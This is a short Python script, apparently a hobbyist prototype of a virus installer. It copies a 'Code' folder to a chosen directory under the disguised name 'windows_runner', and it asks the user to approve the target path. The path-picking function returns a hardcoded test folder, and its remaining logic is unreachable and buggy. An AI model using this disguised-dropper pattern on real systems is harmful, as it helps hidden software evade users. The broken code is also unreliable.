import os
import shutil
import random

def get_random_path(path = "C:\\"):
    return r"C:\Users\iddor\OneDrive\Desktop\python\local_vir_2\Vir\Testing"
    try:
        subs = [name for name in os.listdir(path) if os.path.isdir(f"{path}\\{name}")]
        v = random.randint(len(subs) - 1)
        return get_random_path(f"{path}\\{subs[v]}")
    except: return path


def install_virus():
    # get the paths
    COPY_PATH = "\\".join(str(__file__).split("\\")[:-2])
    
    print("STAGE 1")
    CODE_WHITE_NAME = "windows_runner"
    PYTHON_WHITE_NAME = "python"
    CODE_PATH = f"{COPY_PATH}\\Code"
    #PYTHON_PATH = f"{COPY_PATH}\\Python"
    
    #print(f"code path: {CODE_PATH}\npython path: {PYTHON_PATH}")
    while (True):
        VIR_PATH = get_random_path()
        ans = input(f"do you aprove [{VIR_PATH}]: ")
        if (ans == 'y'): break
        
    DEST_CODE_PATH, DEST_PYTHON_PATH = f"{VIR_PATH}\\{CODE_WHITE_NAME}", f"{VIR_PATH}\\{PYTHON_WHITE_NAME}"
    print(f"vir path: {VIR_PATH}\nvir code path: {DEST_CODE_PATH}\nvir python path: {DEST_PYTHON_PATH}")
    print(f"\n\nSTAGE 2 copy files")
    print(f"copy code to {DEST_CODE_PATH}")
    shutil.copytree(CODE_PATH, DEST_CODE_PATH)
    print(f"copy python to {DEST_PYTHON_PATH}")
    #shutil.copytree(PYTHON_PATH, DEST_PYTHON_PATH)    
    

if (__name__ == "__main__"):
    install_virus()